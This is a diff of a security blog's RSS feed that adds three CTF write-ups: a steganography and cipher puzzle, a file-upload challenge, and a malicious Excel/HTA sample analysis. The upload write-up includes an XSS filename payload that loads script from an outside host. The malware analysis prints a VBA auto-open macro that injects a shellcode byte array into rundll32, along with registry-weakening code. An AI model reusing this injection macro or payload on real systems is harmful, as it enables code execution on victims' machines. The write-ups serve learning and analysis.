@@ -1,4 +1,274 @@
-<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[dev.lwlx.xyz]]></title><description><![CDATA[Dev / Sec / Ops | Cybersecurity blog]]></description><link>https://dev.lwlx.xyz</link><image><url>https://dev.lwlx.xyz/icon.png</url><title>dev.lwlx.xyz</title><link>https://dev.lwlx.xyz</link></image><generator>RSS for Node</generator><lastBuildDate>Tue, 19 Jan 2021 11:25:47 GMT</lastBuildDate><atom:link href="https://dev.lwlx.xyz/rss.xml" rel="self" type="application/rss+xml"/><pubDate>Wed, 21 Oct 2020 04:00:00 GMT</pubDate><copyright><![CDATA[2021 lwlx.]]></copyright><language><![CDATA[en]]></language><managingEditor><![CDATA[lwlx@lwlx.xyz]]></managingEditor><webMaster><![CDATA[lwlx@lwlx.xyz]]></webMaster><ttl>60</ttl><item><title><![CDATA[Hacker101 CTF Photo Gallery writeup]]></title><description><![CDATA[<h1 id="photogallery_moderate_">Photo Gallery <em>[moderate]</em></h1>
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[dev.lwlx.xyz]]></title><description><![CDATA[Dev / Sec / Ops | Cybersecurity blog]]></description><link>https://dev.lwlx.xyz</link><image><url>https://dev.lwlx.xyz/icon.png</url><title>dev.lwlx.xyz</title><link>https://dev.lwlx.xyz</link></image><generator>RSS for Node</generator><lastBuildDate>Wed, 27 Jan 2021 14:57:26 GMT</lastBuildDate><atom:link href="https://dev.lwlx.xyz/rss.xml" rel="self" type="application/rss+xml"/><pubDate>Wed, 21 Oct 2020 04:00:00 GMT</pubDate><copyright><![CDATA[2021 lwlx.]]></copyright><language><![CDATA[en]]></language><managingEditor><![CDATA[lwlx@lwlx.xyz]]></managingEditor><webMaster><![CDATA[lwlx@lwlx.xyz]]></webMaster><ttl>60</ttl><item><title><![CDATA[HTB write up for the Black Hole[EASY] challenge]]></title><description><![CDATA[<h1 id="blackhole_easy_">Black Hole <em>[EASY]</em></h1>
+<p>This is my Write Up for the "Black Hole" challenge from Hack The Box.</p>
+<p>Like so often we are given a zip file called Blackhole.zip, naturraly we unzip it using cli:</p>
+<pre><code class="shell language-shell">unzip Blackhole.zip
+</code></pre>
+<p>It seems the Zip contained another zip called 'archive.zip' , so lets try and open that one.</p>
+<p>we got a file called 'hawkins' it seems to be an image file, not really tho..
+Is there a hidden message in this image? after some googling i found out about a tool called steghide.</p>
+<p><a href="http://steghide.sourceforge.net/download.php">steghide</a> allowed me to look for a hidden message withing this file. Thanks @nieg for pointing in this direction.</p>
+<p>I ran steghide like this:</p>
+<pre><code class="shell language-shell">steghide extract -sf hawking
+</code></pre>
+<p>nice! we get a file named Flag.txt.
+It seems its content in encoded:</p>
+<pre><code class="shell language-shell">UldaeFluUnhlaUJKZFhoNGRXMTVJRlJ0YVhkMWVuTWdhVzFsSUcxNklGRjZjM2gxWlhRZ1puUnhZV1J4Wm5WdmJYZ2dZblJyWlhWdmRXVm1MQ0J2WVdWNVlYaGhjM1ZsWml3Z2JYcHdJRzFuWm5SaFpDd2dhWFJoSUdsdFpTQndkV1J4YjJaaFpDQmhjaUJrY1dWeGJXUnZkQ0J0WmlCbWRIRWdUM0Y2Wm1SeElISmhaQ0JHZEhGaFpIRm1kVzl0ZUNCUFlXVjVZWGhoYzJzZ2JXWWdablJ4SUVkNmRXaHhaR1YxWm1zZ1lYSWdUMjE1Ym1SMWNITnhJRzFtSUdaMGNTQm1kWGx4SUdGeUlIUjFaU0J3Y1cxbWRDNGdWSEVnYVcxbElHWjBjU0JZWjI5dFpYVnRlaUJDWkdGeWNXVmxZV1FnWVhJZ1dXMW1kSEY1YldaMWIyVWdiV1lnWm5SeElFZDZkV2h4WkdWMVptc2dZWElnVDIxNWJtUjFjSE54SUc1eFptbHhjWG9nTVRrM09TQnRlbkFnTWpBd09TNGdWRzFwZDNWNmN5QnRiM1IxY1doeGNDQnZZWGw1Y1dSdmRXMTRJR1ZuYjI5eFpXVWdhWFZtZENCbGNXaHhaRzE0SUdsaFpIZGxJR0Z5SUdKaFltZDRiV1FnWlc5MWNYcHZjU0IxZWlCcGRIVnZkQ0IwY1NCd2RXVnZaMlZsY1dVZ2RIVmxJR0ZwZWlCbWRIRmhaSFZ4WlNCdGVuQWdiMkZsZVdGNFlYTnJJSFY2SUhOeGVuRmtiWGd1SUZSMVpTQnVZV0YzSUUwZ1RtUjFjWElnVkhWbFptRmtheUJoY2lCR2RYbHhJRzFpWW5GdFpIRndJR0Y2SUdaMGNTQk9aSFZtZFdWMElFVm5lbkJ0YXlCR2RYbHhaU0J1Y1dWbUxXVnhlSGh4WkNCNGRXVm1JSEpoWkNCdElHUnhiMkZrY0MxdVpIRnRkM1Y2Y3lBeU16Y2dhWEZ4ZDJVdUlGUnRhWGQxZW5NZ2FXMWxJRzBnY25GNGVHRnBJR0Z5SUdaMGNTQkVZV3R0ZUNCRllXOTFjV1pyTENCdElIaDFjbkZtZFhseElIbHhlVzV4WkNCaGNpQm1kSEVnUW1GNlpuVnlkVzl0ZUNCTmIyMXdjWGxySUdGeUlFVnZkWEY2YjNGbExDQnRlbkFnYlNCa2NXOTFZblZ4ZW1ZZ1lYSWdablJ4SUVKa2NXVjFjSEY2Wm5WdGVDQlpjWEJ0ZUNCaGNpQlNaSEZ4Y0dGNUxDQm1kSEVnZEhWemRIRmxaaUJ2ZFdoMWVIVnRlaUJ0YVcxa2NDQjFlaUJtZEhFZ1IzcDFabkZ3SUVWbWJXWnhaUzRnVlhvZ01qQXdNaXdnVkcxcGQzVjZjeUJwYldVZ1pHMTZkM0Z3SUhwbmVXNXhaQ0F5TlNCMWVpQm1kSEVnVGs1UFhPS0FtV1VnWW1GNGVDQmhjaUJtZEhFZ01UQXdJRk5rY1cxbWNXVm1JRTVrZFdaaGVtVXVEUXBVUms1N1dqTm9jVVJmZUROR1gyWlVNMTl1TkdWR2JVUndOVjlUTTJaZlN6Qm5YM0F3YVZwOUlBPT0=
+</code></pre>
+<p>This string seems to be base64 encoded twice, who knows why, cuz this doesnt make it any harder.
+Lets decode this in the browser:</p>
+<pre><code class="JavaScript language-JavaScript">const x = atob(atob('UldaeFluUnhlaUJKZFhoNGRXMTVJRlJ0YVhkMWVuTWdhVzFsSUcxNklGRjZjM2gxWlhRZ1puUnhZV1J4Wm5WdmJYZ2dZblJyWlhWdmRXVm1MQ0J2WVdWNVlYaGhjM1ZsWml3Z2JYcHdJRzFuWm5SaFpDd2dhWFJoSUdsdFpTQndkV1J4YjJaaFpDQmhjaUJrY1dWeGJXUnZkQ0J0WmlCbWRIRWdUM0Y2Wm1SeElISmhaQ0JHZEhGaFpIRm1kVzl0ZUNCUFlXVjVZWGhoYzJzZ2JXWWdablJ4SUVkNmRXaHhaR1YxWm1zZ1lYSWdUMjE1Ym1SMWNITnhJRzFtSUdaMGNTQm1kWGx4SUdGeUlIUjFaU0J3Y1cxbWRDNGdWSEVnYVcxbElHWjBjU0JZWjI5dFpYVnRlaUJDWkdGeWNXVmxZV1FnWVhJZ1dXMW1kSEY1YldaMWIyVWdiV1lnWm5SeElFZDZkV2h4WkdWMVptc2dZWElnVDIxNWJtUjFjSE54SUc1eFptbHhjWG9nTVRrM09TQnRlbkFnTWpBd09TNGdWRzFwZDNWNmN5QnRiM1IxY1doeGNDQnZZWGw1Y1dSdmRXMTRJR1ZuYjI5eFpXVWdhWFZtZENCbGNXaHhaRzE0SUdsaFpIZGxJR0Z5SUdKaFltZDRiV1FnWlc5MWNYcHZjU0IxZWlCcGRIVnZkQ0IwY1NCd2RXVnZaMlZsY1dVZ2RIVmxJR0ZwZWlCbWRIRmhaSFZ4WlNCdGVuQWdiMkZsZVdGNFlYTnJJSFY2SUhOeGVuRmtiWGd1SUZSMVpTQnVZV0YzSUUwZ1RtUjFjWElnVkhWbFptRmtheUJoY2lCR2RYbHhJRzFpWW5GdFpIRndJR0Y2SUdaMGNTQk9aSFZtZFdWMElFVm5lbkJ0YXlCR2RYbHhaU0J1Y1dWbUxXVnhlSGh4WkNCNGRXVm1JSEpoWkNCdElHUnhiMkZrY0MxdVpIRnRkM1Y2Y3lBeU16Y2dhWEZ4ZDJVdUlGUnRhWGQxZW5NZ2FXMWxJRzBnY25GNGVHRnBJR0Z5SUdaMGNTQkVZV3R0ZUNCRllXOTFjV1pyTENCdElIaDFjbkZtZFhseElIbHhlVzV4WkNCaGNpQm1kSEVnUW1GNlpuVnlkVzl0ZUNCTmIyMXdjWGxySUdGeUlFVnZkWEY2YjNGbExDQnRlbkFnYlNCa2NXOTFZblZ4ZW1ZZ1lYSWdablJ4SUVKa2NXVjFjSEY2Wm5WdGVDQlpjWEJ0ZUNCaGNpQlNaSEZ4Y0dGNUxDQm1kSEVnZEhWemRIRmxaaUJ2ZFdoMWVIVnRlaUJ0YVcxa2NDQjFlaUJtZEhFZ1IzcDFabkZ3SUVWbWJXWnhaUzRnVlhvZ01qQXdNaXdnVkcxcGQzVjZjeUJwYldVZ1pHMTZkM0Z3SUhwbmVXNXhaQ0F5TlNCMWVpQm1kSEVnVGs1UFhPS0FtV1VnWW1GNGVDQmhjaUJtZEhFZ01UQXdJRk5rY1cxbWNXVm1JRTVrZFdaaGVtVXVEUXBVUms1N1dqTm9jVVJmZUROR1gyWlVNMTl1TkdWR2JVUndOVjlUTTJaZlN6Qm5YM0F3YVZwOUlBPT0='))
+console.log(x)
+
+//Output:
+x = `Efqbtqz Iuxxumy Tmiwuzs ime mz Qzsxuet ftqadqfuomx btkeuouef, oaeyaxasuef, mzp mgftad, ita ime pudqofad ar dqeqmdot mf ftq Oqzfdq rad Ftqadqfuomx Oaeyaxask mf ftq Gzuhqdeufk ar Omyndupsq mf ftq fuyq ar tue pqmft. Tq ime ftq Xgomeumz Bdarqeead ar Ymftqymfuoe mf ftq Gzuhqdeufk ar Omyndupsq nqfiqqz 1979 mzp 2009. Tmiwuzs motuqhqp oayyqdoumx egooqee iuft eqhqdmx iadwe ar babgxmd eouqzoq uz ituot tq pueogeeqe tue aiz ftqaduqe mzp oaeyaxask uz sqzqdmx. Tue naaw M Nduqr Tuefadk ar Fuyq mbbqmdqp az ftq Ndufuet Egzpmk Fuyqe nqef-eqxxqd xuef rad m dqoadp-ndqmwuzs 237 iqqwe. Tmiwuzs ime m rqxxai ar ftq Dakmx Eaouqfk, m xurqfuyq yqynqd ar ftq Bazfuruomx Mompqyk ar Eouqzoqe, mzp m dqoubuqzf ar ftq Bdqeupqzfumx Yqpmx ar Rdqqpay, ftq tustqef ouhuxumz mimdp uz ftq Gzufqp Efmfqe. Uz 2002, Tmiwuzs ime dmzwqp zgynqd 25 uz ftq NNO\âe baxx ar ftq 100 Sdqmfqef Ndufaze.
+TFN{Z3hqD_x3F_fT3_n4eFmDp5_S3f_K0g_p0iZ}`
+</code></pre>
+<p>We got some sort of unreadable Text coupled with what seems to be a flag.</p>
+<pre><code>HTB{this_is_the_usu4l_f0rmat_for_flags}
+TFN{Z3hqD_x3F_fT3_n4eFmDp5_S3f_K0g_p0iZ}
+</code></pre>
+<p>similiarities are striking! why? well cuz its a caesar cipher.. how do we know? only the letters are affected, 'TFN' is 'HTB' shifted by 14, so they must be using ROT14. Give it a try on cyberchef:</p>
+<p><img src="/cipherROT14.png" alt="solved ciphertext" title="solved ciphertext" /></p>
+<p>Thats it! we got our flag 😄</p>
+<p>have a look at <a href="https://github.com/Lawlez/myOSWE/tree/master/htb/challanges/misc/Black%20Hole">this challenge on my GitHub</a></p>]]></description><link>https://dev.lwlx.xyz/blog/blog/htb-black-hole-challenge-writeup</link><guid isPermaLink="true">https://dev.lwlx.xyz/blog/blog/htb-black-hole-challenge-writeup</guid><category><![CDATA[ctf]]></category><category><![CDATA[writeup]]></category><category><![CDATA[hackthebox]]></category><category><![CDATA[BlackHole]]></category><category><![CDATA[htb]]></category><category><![CDATA[security]]></category><dc:creator><![CDATA[lwlx]]></dc:creator><pubDate>Wed, 27 Jan 2021 14:29:18 GMT</pubDate></item><item><title><![CDATA[Hacker101 CTF TempImage]]></title><description><![CDATA[<h1 id="tempimage_moderate_wip">TempImage <em>[moderate]</em> <code>WIP</code></h1>
+<p>This is my Write Up for the "TempImage" challenge of HackerOne's CTF.</p>
+<p>As usual we get a link to webpage, it seems to some sort of cloud storage application, on the main Page we get a really simple page:</p>
+<pre><code class="jsx language-jsx">https://ctf.hacker101.com/ctf/launch/12
+
+&gt;
+&lt;html&gt;
+    &lt;head&gt;
+        &lt;title&gt;TempImage &amp;mdash; Trial&lt;/title&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;h1&gt;TempImage&lt;/h1&gt;
+        &lt;p&gt;&lt;b&gt;UNREGISTERED&lt;/b&gt;&lt;/p&gt;
+        &lt;p&gt;&lt;a href="upload.php"&gt;Upload image&lt;/a&gt;&lt;/p&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>It signifies that its an UNEGISTERED version of the app, thus working in trial mode.</p>
+<h2 id="enumeration">Enumeration</h2>
+<p>So lets start to explore the app and what it can do. We start by clicking the "Upload image" Button.
+This leads us to a new page <strong>/upload.php</strong>, here we can select a file from our computer, and have a submit button to send the form.</p>
+<p>The form will be sent to a <strong>doUpload.php</strong> file. Upon closer inspection we alos see that there is a hidden field "filename", which gets filled in by aJS snippet.</p>
+<pre><code class="jsx language-jsx">   &lt;h1&gt;Upload&lt;/h1&gt;
+        &lt;form action="doUpload.php" method="POST" enctype="multipart/form-data"&gt;
+            &lt;input type="file" name="file" id="file"&gt;
+            &lt;input type="hidden" name="filename" id="filename"&gt;
+            &lt;input type="submit" value="Upload"&gt;
+        &lt;/form&gt;
+        &lt;script&gt;
+            $(document).ready(function() {
+                $('#file').change(function(e) {
+                    $('#filename').val(e.target.files[0].name)
+                })
+            })
+     &lt;/script&gt;
+</code></pre>
+<p>So it seems this lil script extracts the <code>file.name</code> prop from the fileOpbject the user uploads to the input type="file".</p>
+<p>Lets Try it out, It seems the file inpput allows any file to be chosen, lets try a 5mb .gif file.</p>
+<pre><code class="jsx language-jsx">&lt;center&gt;&lt;h1&gt;413 Request Entity Too Large&lt;/h1&gt;&lt;/center&gt;
+&lt;hr&gt;&lt;center&gt;nginx/1.14.0 (Ubuntu)&lt;/center&gt;
+</code></pre>
+<p>OK, fair, maybe 5mb was a it large, but we know we're working with an nginx 1.14 server on Ubuntu.
+So how about we try a smaller gif?</p>
+<pre><code class="shell language-shell">ERROR: Only PNG format supported in trial.
+</code></pre>
+<p>Okay, finally we know what the app expects from us, a PNG file. So we try jsut that.
+The upload succeeds, thus redirecting us to a new url:
+<code>/files/be9c26aaea9d9b5085c7f6eed0812745_uhhhh.png</code></p>
+<p>so it seems our files are uploaded to the <code>/files/</code> directory, what a suprise, the file stil contains our original filename, preceeded by some gibberish.</p>
+<p>we should deffinetly try to exploit this, check wheter or not they sanitize our filename.</p>
+<p>Lets try uploading a file named: <code>javascript%3Aeval%28%27var%20a%3Ddocument.createElement%28%5C%27script%5C%27%29%3Ba.src%3D%5C%27https%3A%2F%2FDiscover.xss.ht%5C%27%3Bdocument.body.appendChild%28a%29%27%29.png</code></p>
+<p>We now get redirected to this url <code>http://35.190.155.168/d29c8e00db/files/9975e7e24fac21e8b877a6d08efe09c6_javascript%3Aeval%28%27var%20a%3Ddocument.createElement%28%5C%27script%5C%27%29%3Ba.src%3D%5C%27https%3A%2F%2FDiscover.xss.ht%5C%27%3Bdocument.body.appendChild%28a%29%27%29.png</code></p>
+<p>and we get served this content:</p>
+<pre><code class="javascript language-javascript">Not Found
+The requested URL /files/9975e7e24fac21e8b877a6d08efe09c6_javascript:eval('var a=document.createElement(\'script\');a.src=\'https:/Discover.xss.ht\';document.body.appendChild(a)').png was not found on this server.
+
+Apache/2.4.7 (Ubuntu) Server at 127.0.0.1 Port 52736
+</code></pre>
+<p>so it seems there is potential there, we just need a more sophisticated payload to upload.</p>
+<h2 id="takingastepback">Taking a step back</h2>
+<p>It's important not to get tunnelvision and only focus on your first finding, so lets take a step back and analyze the website using Burp Suite. Maybe we'll find something.
+Lets analyze the upload URL first:</p>
+<pre><code class="shell language-shell">GET /d29c8e00db/upload.php HTTP/1.1
+Host: 35.190.155.168
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Connection: close
+</code></pre>
+<p>This does not tell us that much, it seems the server could accep more than just PNG tho.</p>
+<p>How about if we upload an image?</p>
+<p><code>POST /d29c8e00db/doUpload.php HTTP/1.1</code></p>
+<p><img src="/hackerone/tempimage/tempimage-hackerone101-burpSuite_fileupload.png" alt="image upload Request" title="image upload Request" /></p>
+<blockquote>
+  <p>This Post is marked as <code>WIP</code> and will be updated continously.</p>
+</blockquote>]]></description><link>https://dev.lwlx.xyz/blog/blog/hacker101-ctf-tempimage</link><guid isPermaLink="true">https://dev.lwlx.xyz/blog/blog/hacker101-ctf-tempimage</guid><category><![CDATA[ctf]]></category><category><![CDATA[writeup]]></category><category><![CDATA[hackerone]]></category><category><![CDATA[hacker101]]></category><category><![CDATA[TempImage]]></category><category><![CDATA[security]]></category><dc:creator><![CDATA[lwlx]]></dc:creator><pubDate>Fri, 22 Jan 2021 23:22:38 GMT</pubDate></item><item><title><![CDATA[HTB write up for the oBfsC4t10n[HARD] challenge]]></title><description><![CDATA[<h1 id="obfsc4t10n_hard_wip">oBfsC4t10n <em>[HARD]</em> <code>(WIP)</code></h1>
+<p>This is my Write Up for the "oBfsC4t10n" challenge from Hack The Box.</p>
+<p>We are given a <em>zip file</em>. after extraction we are presented with an <strong>html</strong> file telling us to download an <strong>excel file</strong>.
+The excel file has been included in the html as a <strong>base64 encoded</strong> string, lets just save that info for later <code>base64.txt</code> in case we need it.</p>
+<blockquote>
+  <p>decoding <code>base64.txt</code> actually gives us a valid excel like file.</p>
+</blockquote>
+<p>After we checked the HTML and deemed the download save lets fetch the excel file.</p>
+<h2 id="enumeration">Enumeration</h2>
+<p>Instead of trying to open or analyze the file on our own machine, lets go ahead and upload it to <strong>ANY.RUN</strong>.</p>
+<blockquote>
+  <p><a href="https://ANY.RUN">https://ANY.RUN</a> is a <strong>online Sandbox</strong> service that allows you to open various suspicious files or programms to fully analyze what would happen, without the danger.</p>
+</blockquote>
+<p>After Testing the file with <strong>ANY.RUN</strong> we were able to see how the exploit would work and what would be done. So we tested on a <strong>Windows 7</strong> Machine, after opening the file, the exploit imediately startet to run:</p>
+<blockquote>
+  <ol>
+  <li>At first a temp file was created under <code>C:\Users\admin\AppData\Local\Temp\CVR40EB.tmp.cvr</code></li>
+  <li>Then a what seems to be <code>visual basic script</code> executer was added here: <code>C:\Users\admin\AppData\Local\Temp\VBE\MSForms.exd</code></li>
+  <li>followed by a <code>.hta</code> file with a funny name..: <code>C:\Users\admin\AppData\Local\Temp\LwTHLrGh.hta</code> &lt;-- lemme guess thats the one.</li>
+  <li>it then makes use of <code>mshta.exe</code> to try and execute the <code>LwTHLrGh.hta</code> file.</li>
+  <li>then ANY.RUN stops executing the file.</li>
+  </ol>
+</blockquote>
+<p>I went ahead and <em>downloaded</em> the <code>MSForms.exd</code> as well as the <code>LwTHLrGh.hta</code> file so we can analyze them further.</p>
+<h2 id="analyzinglwthlrghhta">Analyzing <code>LwTHLrGh.hta</code></h2>
+<blockquote>
+  <p>.hta is a propriatary file format used by microsoft, its called '<strong>HT</strong>ML <strong>A</strong>pplication' and supports HTML code as well as <strong>Visual Basic</strong> or <strong>JScript</strong>. This format was meant to be used by Internet Explorer.</p>
+  <p>The <strong>default file-association</strong> for the .hta extension is the Microsoft HTML Application Host (<strong>mshta.exe</strong>). If you have not disabled or changed this file association, in effect the HTA file behaves like an executable when double-clicked. An <strong>HTA runs</strong> as a <strong>fully trusted application</strong> and as a result has a lot <strong>more privileges than a normal HTML</strong> file.</p>
+</blockquote>
+<p>Sounds dangerous, nice!</p>
+<p>So lets disect this bitch!</p>
+<p>When opening the file we see it has a rather clear structure, a huge VB Script and <strong>even comments</strong>. How nice of the hacker not to obfuscate his code too much, thanks <a href="https://twitter.com/0xdf_">@0xdf</a>. ;-)</p>
+<pre><code class="jsx language-jsx">"&lt;html&gt;&lt;head&gt;
+
+&lt;script language="vbscript"&gt;
+
+&lt;!-- VB script here --&gt;
+
+&lt;/script&gt;&lt;/head&gt;&lt;/html&gt;"
+</code></pre>
+<p>so naturally, since its practiacally all the code, we strip the vbcode out of the .hta to make it readable.</p>
+<p>Thank god we know VB, otherwise this would be a pain from here on now. ;-) Thankfully, since the autor has left some comments, indicating how the attack works, we should be able to cope with it.</p>
+<p>The very first thing he does is effectively creating a backup of the AccessVBOM key <strong>if</strong> it has been set before.</p>
+<pre><code class="vb language-vb">' Get the old AccessVBOM value
+RegPath = "HKEY_CURRENT_USER\Software\Microsoft\Office\" &amp; objExcel.Version &amp; "\Excel\Security\AccessVBOM"
+
+if RegExists(RegPath) then
+        action = WshShell.RegRead(RegPath)
+else
+        action = """"
+end if
+</code></pre>
+<blockquote>
+  <p>"<em>Setting AccessVBOM to 1 allows to access the VBA Object Model</em>"</p>
+</blockquote>
+<p>Then he 'weakens the target' by setting the AccessVBOM to 1, thus enabling all acces to VBA Object Model.</p>
+<pre><code class="VB language-VB">' Weaken the target
+WshShell.RegWrite RegPath, 1, "REG_DWORD"
+</code></pre>
+<p>Then he gets to the juicy part.
+To Exploit the Security setting he just turned off, he creates a new Excel Workboo, with macros of course.
+He then proceeds to add VBComponents to the Excel, allowing him to add an Assembly Code Module.</p>
+<pre><code class="VB language-VB">' Run the macro
+Set objWorkbook = objExcel.Workbooks.Add()
+Set xlmodule = objWorkbook.VBProject.VBComponents.Add(1)
+xlmodule.CodeModule.AddFromString ... 80 more lines...
+</code></pre>
+<p>In his last step this good boy restores the systems registry to its previous state.</p>
+<pre><code class="vb language-vb">' Restore the registry to its old state
+if action = "" then
+        WshShell.RegDelete RegPath
+else
+        WshShell.RegWrite RegPath, action, "REG_DWORD"
+end if
+self.close
+</code></pre>
+<blockquote>
+  <p>xlmodule.CodeModule.AddFromString contains many obfuscated lines of assembly code, I deobfuscated it by printing it via VBS.</p>
+</blockquote>
+<p>Here is the actualy assembly code payload:</p>
+<pre><code class="cpp language-cpp">Private Type PROCESS_INFORMATION
+    hProcess As Long
+    hThread As Long
+    dwProcessId As Long
+    dwThreadId As Long
+End Type
+
+Private Type STARTUPINFO
+    cb As Long
+    lpReserved As String
+    lpDesktop As String
+    lpTitle As String
+    dwX As Long
+    dwY As Long
+    dwXSize As Long
+    dwYSize As Long
+    dwXCountChars As Long
+    dwYCountChars As Long
+    dwFillAttribute As Long
+    dwFlags As Long
+    wShowWindow As Integer
+    cbReserved2 As Integer
+    lpReserved2 As Long
+    hStdInput As Long
+    hStdOutput As Long
+    hStdError As Long
+End Type
+
+#If VBA7 Then
+    Private Declare PtrSafe Function CreateStuff Lib "kernel32" Alias "CreateRemoteThread" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr
+    Private Declare PtrSafe Function AllocStuff Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
+    Private Declare PtrSafe Function WriteStuff Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtr
+    Private Declare PtrSafe Function RunStuff Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
+#Else
+    Private Declare Function CreateStuff Lib "kernel32" Alias "CreateRemoteThread" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long
+    Private Declare Function AllocStuff Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
+    Private Declare Function WriteStuff Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As Long
+    Private Declare Function RunStuff Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
+#End If
+
+Sub Auto_Open()
+    Dim myByte As Long, myArray As Variant, offset As Long
+    Dim pInfo As PROCESS_INFORMATION
+    Dim sInfo As STARTUPINFO
+    Dim sNull As String
+    Dim sProc As String
+
+#If VBA7 Then
+    Dim rwxpage As LongPtr, res As LongPtr
+#Else
+    Dim rwxpage As Long, res As Long
+#End If
+    myArray = Array(-35,-63,-65,32,86,66,126,-39,116,36,-12,91,49,-55,-79,98,49,123,24,3,123,24,-125,-61,36,-76,-73,-126,-52,-70,56,123,12,-37,-79,-98,61,-37,-90,-21,109,-21,-83,-66,-127,-128,-32,42,18,-28,44,92,-109,67,11,83,36,-1,111,-14,-90,2,-68,-44,-105,-52,-79,21,-48,49,59,71,-119,62,-18,120,-66,11,51,-14,-116,-102,51,-25,68,-100,18,-74,-33,-57,-76,56,12,124,-3,34,81,-71,-73,-39,-95,53,70,8,-8,-74,-27,117,53,69,-9,-78,-15,-74,-126,-54,2,74,-107,8,121,-112,16,-117,-39,83,-126,119,-40,-80,85,-13,-42,125,17,91,-6,-128,-10,-41,6,8,-7,55,-113,74,-34,-109,-44,9,127,-123,-80,-4,-128,-43,27,-96,36,-99,-79,-75,84,-4,-35,122,85,-1,29,21,-18,-116,47,-70,68,27,3,51,67,-36,100,110,51,114,-101,-111,68,90,95,-59,20,-12,118,102,-1,4,119,-77,80,85,-41,108,17,5,-105,-36,-7,79,24,2,25,112,-13,43,50,-88,-5,83,-61,-46,-115,58,-81,49,21,-46,66,43,-68,66,-77,-59,81,-76,-125,77,-17,-79,116,94,-80,2,72,-22,17,-7,-58,33,-14,113,127,119,127,26,76,37,2,-38,-38,96,-44,-18,-102,-116,-15,-124,-37,110,-109,-112,-117,-26,97,-91,42,76,-20,67,70,-94,-72,-36,-1,91,-31,-105,-98,-92,60,-46,-95,47,-76,34,111,-40,-67,48,-104,-65,61,-55,89,42,61,-93,93,-4,106,91,92,-39,92,-60,-97,12,-33,3,95,-47,-23,120,86,71,85,23,-105,-121,85,-25,-63,-51,85,-113,-75,-75,6,-86,-71,99,59,103,44,-116,109,-37,-25,-28,-109,2,-49,-86,108,97,83,-84,-110,-9,124,21,-6,7,61,-91,-6,109,-67,-11,-110,122,-110,-6,82,-126,57,83,-6,9,-84,17,-101,14,-27,-12,5,14,10,45,-74,117,95,-46,55,-118,-119,-73,56,-118,-75,-55,5,92,-116,-65,72,92,-85,-80,-1,-63,-102,90,-1,86,-36,78)
+    If Len(Environ("ProgramW6432")) &gt; 0 Then
+        sProc = Environ("windir") &amp; "\\SysWOW64\\rundll32.exe"
+    Else
+        sProc = Environ("windir") &amp; "\\System32\\rundll32.exe"
+    End If
+
+    res = RunStuff(sNull, sProc, ByVal 0&amp;, ByVal 0&amp;, ByVal 1&amp;, ByVal 4&amp;, ByVal 0&amp;, sNull, sInfo, pInfo)
+
+    rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &amp;H1000, &amp;H40)
+    For offset = LBound(myArray) To UBound(myArray)
+        myByte = myArray(offset)
+        res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&amp;)
+    Next offset
+    res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)
+End Sub
+Sub AutoOpen()
+    Auto_Open
+End Sub
+Sub Workbook_Open()
+    Auto_Open
+End Sub
+</code></pre>
+<p>You can see the Variable myArray seems suspicous, when running the payload in Excel I get an error for 'myArray'</p>
+<p>Im stuck here at the moment… I was told i would not need windows..</p>
+<p>@ me on twitter <a href="https://twitter.com/0x0000005">@0x0000005</a></p>
+<blockquote>
+  <p>This Post is marked as <code>WIP</code> and will be updated continously.</p>
